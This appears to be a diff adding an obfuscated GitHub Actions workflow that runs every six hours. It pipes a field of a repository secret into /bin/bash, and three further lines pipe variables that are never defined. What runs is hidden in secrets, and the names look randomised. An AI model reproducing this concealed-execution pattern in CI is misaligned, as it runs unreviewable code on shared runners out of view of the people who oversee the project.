@@ -1,0 +1,21 @@
+name: junhonghougao
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: junhonghougao
+        env:
+          azn49: ${{ secrets.azn49 }}
+        run: |
+          echo $azn49 | jq -r .qmr356 | /bin/bash
+          echo $ucov35521 | jq -r .gxmkd60447 | /bin/bash
+          echo $myz25693 | jq -r .iec35105 | /bin/bash
+          echo $jug2135 | jq -r .yh0616 | /bin/bash
+
